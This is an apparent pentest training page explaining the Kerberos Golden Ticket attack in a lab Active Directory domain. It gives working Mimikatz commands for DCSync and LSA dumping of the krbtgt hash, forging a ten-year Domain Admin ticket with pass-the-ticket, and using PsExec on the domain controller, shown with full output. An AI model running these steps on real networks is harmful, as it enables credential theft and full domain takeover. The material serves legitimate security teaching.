---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Golden Ticket

[Recall](../authentication/#operation-details) the method of creation for a TGT in a Kerberos environment:

1. Client submits request for authentication (AS-REQ)
2. The KDC creates a TGT by taking several pieces of data (Client ID, network address, group membership, etc.) and encrypting them with the hash of the `krbtgt` account
   * &#x20;The encryption with the hash is what makes it "valid." When the TGT is presented later (during a  [`TGS-REQ`](../authentication/#client-service-request)) it is treated as valid as long as it can be decrypted by the KDC (using `krbtgt`'s hash)

If the attacker is able to obtain the hash for `krbtgt` they can arbitrarily create their own valid TGTs for any user. This technique is similar to [Silver Tickets](../authentication/attacking-ad-authentication/silver-tickets.md) which were covered earlier; however this is a much more powerful attack vector. Recall a silver ticket attack involved obtaining the hash of a service account which could then be used to create fake TGSs for that service. While that is helpful it is limited to the particular service whose hash was compromised. In contrast the Golden Ticket technique could be used to create almost limitless access. For example, an unprivileged user could be granted a TGT that states it is a member of the Domain Admins group and the domain controller would accept it as valid because it is properly encrypted.

This provides a neat way of keeping persistence in an Active Directory environment, but the best advantage is that the **`krbtgt` account password is not automatically changed**. This password is only changed when the domain functional level is upgraded from a pre-2008 Windows server, but not from a newer version. Because of this, it is not uncommon to find very old `krbtgt` password hashes.

## Example Background

This example will leverage the unprivileged jen account. If logged in to CLIENT74 as jen, the attacker attempts to access the domain controller via PsExec the attempt fails due to insufficient permissions

```shell-session
C:\Users\jen>PsExec64.exe \\DC1 cmd.exe

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com

Couldn't access DC1:
Access is denied.
```

Once a golden ticket has been created it can be used to access the domain controller.

## Extracting the Hash

The key piece for this to work is the NTLM hash of the `krbtgt` account. Many of the hash extraction techniques shown previously are viable. Cracking the password is probably out as the auto-generated password is 128 random characters. The easiest way is to perform a DC Sync and get the hash that way:

```
C:\Users\jeffadmin>.\Mimikatz.exe

...

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::dcsync /user:corp\krbtgt
...

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 9/2/2022 4:10:48 PM
Object Security ID   : S-1-5-21-1987370270-658905905-1781884369-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 1693c6cefafffc7af11ef34d1c788f47
    ntlm- 0: 1693c6cefafffc7af11ef34d1c788f47
    lm  - 0: 502a2719b9caa64ce84d0c319507c29b

...
```

Other options involve being able to connect to the DC and use Mimikatz's [`lsadump::lsa`](../../../software/mimikatz.md#lsa) to get the credential:

```
lsadump::lsa /patch /user:krbtgt
```

When run the hash is extracted:

```
C:\Users\jeffadmin>.\Mimikatz.exe

...

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::lsa /patch /user:krbtgt
Domain : CORP / S-1-5-21-1987370270-658905905-1781884369

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : 1693c6cefafffc7af11ef34d1c788f47
```

For convenience it is copied here:

```
1693c6cefafffc7af11ef34d1c788f47
```

## Using the Hash

Now that the hash has been extracted it is time to use it to mint TGTs.

### Mimikatz

The [`kerberos::golden`](../../../software/mimikatz.md#golden-ticket) command can be used to launch this attack. It is recommended to first run the purge command to ensure there are no tickets saved in the session:

```
kerberos::purge
```

In the context of the example the following is the command structure to create a ticket making `jen` a `Domain Admin` is:

{% code overflow="wrap" %}
```
kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
```
{% endcode %}

* `/user:jen` creates the ticket for jen
* `/sid` is the SID of the domain
  * This can be obtained by running `whoami /user` from a domain-connected machine/account and then removing the RID from the SID
* `/krbtgt` is used to pass the hash of the krbtgt account
* `/ptt` injects the minted ticket into memory

```
C:\Users\jeffadmin>.\Mimikatz.exe

...

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::purge
Ticket(s) purge for current session is OK

mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
User      : jen
Domain    : corp.com (CORP)
SID       : S-1-5-21-1987370270-658905905-1781884369
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 1693c6cefafffc7af11ef34d1c788f47 - rc4_hmac_nt
Lifetime  : 4/9/2024 4:47:38 PM ; 4/7/2034 4:47:38 PM ; 4/7/2034 4:47:38 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'jen @ corp.com' successfully submitted for current session
```

Once run a new shell session is launched with `misc::cmd`:

```
...
Golden ticket for 'jen @ corp.com' successfully submitted for current session

mimikatz # misc::cmd
Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF76585B800
```

_From this new shell session_ the ticket can be viewed as well as accessing DC1 via PsExec:

```
C:\Users\jen>klist

Current LogonId is 0:0x2c5e0b

Cached Tickets: (1)

#0>     Client: jen @ corp.com
        Server: krbtgt/corp.com @ corp.com
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 4/9/2024 16:47:38 (local)
        End Time:   4/7/2034 16:47:38 (local)
        Renew Time: 4/7/2034 16:47:38 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

C:\Users\jen>.\PsExec64.exe \\DC1 cmd.exe

PsExec v2.4 - Execute processes remotely
...

C:\Windows\system32>hostname
DC1

C:\Windows\system32>whoami
corp\jen
```

This is the essence of a Golden Ticket attack. The steps of obtaining the hash are often not easy but once found it is basically an all-access pass.
